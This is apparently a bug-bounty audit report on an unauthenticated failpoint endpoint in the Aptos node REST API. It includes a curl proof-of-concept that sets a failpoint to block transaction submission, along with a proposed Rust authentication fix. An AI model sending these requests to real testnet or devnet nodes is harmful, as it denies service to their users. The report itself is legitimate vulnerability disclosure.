# Audit Report

## Title
Unauthenticated Failpoint Configuration API Enables Complete REST API Denial of Service

## Summary
The `/v1/set_failpoint` endpoint lacks authentication, allowing any network attacker to configure failpoints in critical API endpoints (`submit_transaction`, `get_account`, etc.) when the debug feature is enabled, causing complete API unresponsiveness and preventing transaction submissions.

## Finding Description

The REST API exposes an unauthenticated endpoint at `/v1/set_failpoint` that allows arbitrary failpoint configuration via HTTP GET requests. [1](#0-0) 

This endpoint accepts two query parameters (`name` and `actions`) and directly configures failpoints through the `fail::cfg()` function with no validation of the caller's identity. [2](#0-1) 

Critical API endpoints contain failpoint triggers that will execute configured actions:
- Transaction submission: [3](#0-2) 
- Account retrieval: [4](#0-3) 

When a failpoint is configured with a "return" action, the `fail_point_poem` helper immediately returns an internal error. [5](#0-4) 

**Attack Flow:**
1. Attacker sends: `GET /v1/set_failpoint?name=api::endpoint_submit_transaction&actions=return`
2. Server configures failpoint without authentication check
3. All subsequent calls to `POST /v1/transactions` fail with internal error
4. Transaction submission becomes impossible, blocking all user operations

The route registration applies no authentication middleware, only CORS, compression, size limits, and logging. [6](#0-5) 

## Impact Explanation

This vulnerability achieves **High Severity** per Aptos bug bounty criteria: "API crashes" and "Validator node slowdowns."

**Impact:**
- **Complete API unavailability**: All transaction submissions blocked indefinitely
- **Denial of service for users**: No ability to interact with the blockchain via REST API
- **Testnet/devnet disruption**: Public infrastructure becomes unusable
- **Resource exhaustion**: Failpoints with `sleep()` actions can cause resource starvation

**Affected Systems:**
- Any node with `failpoints_enabled = true` in configuration
- Testnet and devnet nodes used for development/testing
- Private deployments with debug features enabled

**Mitigation by Design:**
The configuration sanitizer prevents this on mainnet. [7](#0-6) 

However, testnet/devnet are critical public infrastructure, and their disruption constitutes a security issue.

## Likelihood Explanation

**Prerequisites for exploitation:**
1. The `failpoints` Cargo feature must be compiled in (typically debug builds)
2. Configuration must set `failpoints_enabled = true` (defaults to `false`) [8](#0-7) 
3. API endpoint must be publicly accessible

**Likelihood Assessment: LOW to MEDIUM**

While the feature defaults to disabled, operators may enable failpoints on testnet/devnet for debugging purposes. The lack of authentication creates an attack surface whenever the feature is active. Test infrastructure demonstrates this is a realistic configuration. [9](#0-8) 

The vulnerability violates defense-in-depth principles: debug features exposed via network APIs should require authentication regardless of whether they're "intended" for production use.

## Recommendation

**Immediate Fix:** Add authentication to the failpoint endpoint.

```rust
// In api/src/set_failpoints.rs
use poem::web::headers::Authorization;

#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
    auth: Option<Authorization>,
) -> poem::Result<String> {
    // Verify authorization token
    let expected_token = context.node_config.api.failpoint_auth_token.as_ref()
        .ok_or_else(|| poem::Error::from(anyhow::anyhow!("Failpoint auth not configured")))?;
    
    let provided_token = auth
        .ok_or_else(|| poem::Error::from_status(poem::http::StatusCode::UNAUTHORIZED))?
        .0.token();
    
    if provided_token != expected_token {
        return Err(poem::Error::from_status(poem::http::StatusCode::FORBIDDEN));
    }
    
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**Additional Recommendations:**
1. Add `failpoint_auth_token: Option<String>` to `ApiConfig`
2. Log all failpoint configuration attempts with caller IP
3. Implement rate limiting on the endpoint
4. Consider removing the endpoint entirely from release builds

## Proof of Concept

```bash
#!/bin/bash
# Assumes a node running with failpoints_enabled=true

NODE_URL="http://localhost:8080"

# Step 1: Verify API is working
echo "Testing API availability..."
curl -X GET "${NODE_URL}/v1" && echo "✓ API is responsive"

# Step 2: Configure failpoint to break submit_transaction
echo -e "\nConfiguring failpoint..."
curl -X GET "${NODE_URL}/v1/set_failpoint?name=api::endpoint_submit_transaction&actions=return"

# Step 3: Attempt transaction submission (will fail)
echo -e "\nAttempting transaction submission..."
curl -X POST "${NODE_URL}/v1/transactions" \
  -H "Content-Type: application/json" \
  -d '{
    "sender": "0x1",
    "sequence_number": "0",
    "max_gas_amount": "1000",
    "gas_unit_price": "1",
    "expiration_timestamp_secs": "99999999999",
    "payload": {
      "type": "entry_function_payload",
      "function": "0x1::aptos_account::transfer",
      "type_arguments": [],
      "arguments": ["0x2", "100"]
    },
    "signature": {
      "type": "ed25519_signature",
      "public_key": "0x00",
      "signature": "0x00"
    }
  }'

echo -e "\n✗ Transaction submission blocked by failpoint"

# Step 4: Disable failpoint
echo -e "\nDisabling failpoint..."
curl -X GET "${NODE_URL}/v1/set_failpoint?name=api::endpoint_submit_transaction&actions=off"

echo "✓ API restored"
```

**Expected Result:** Transaction submission returns 500 Internal Server Error while failpoint is active, demonstrating complete API DoS.

## Notes

While this vulnerability requires `failpoints_enabled=true` configuration (a debug feature), the complete absence of authentication on a DoS-capable endpoint violates security best practices. Testnet and devnet infrastructure commonly enables debug features, making this a realistic attack surface. The principle of defense-in-depth dictates that all administrative or debug endpoints should implement authentication controls, regardless of their intended usage scope.

### Citations

**File:** api/src/runtime.rs (L237-259)
```rust
        // Build routes for the API
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** api/src/set_failpoints.rs (L23-39)
```rust
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
```

**File:** api/src/transactions.rs (L489-489)
```rust
        fail_point_poem("endpoint_submit_transaction")?;
```

**File:** api/src/accounts.rs (L66-66)
```rust
        fail_point_poem("endpoint_get_account")?;
```

**File:** api/src/failpoint.rs (L14-20)
```rust
pub fn fail_point_poem<E: InternalError>(name: &str) -> Result<(), E> {
    fail::fail_point!(format!("api::{}", name).as_str(), |_| {
        Err(E::internal_with_code_no_info(
            format!("Failpoint unexpected internal error for {}", name),
            AptosErrorCode::InternalError,
        ))
    });
```

**File:** config/src/config/api_config.rs (L122-122)
```rust
            failpoints_enabled: default_disabled(),
```

**File:** config/src/config/api_config.rs (L177-184)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
```

**File:** testsuite/smoke-test/src/execution.rs (L22-23)
```rust
        .with_init_config(Arc::new(|_, config, _| {
            config.api.failpoints_enabled = true;
```
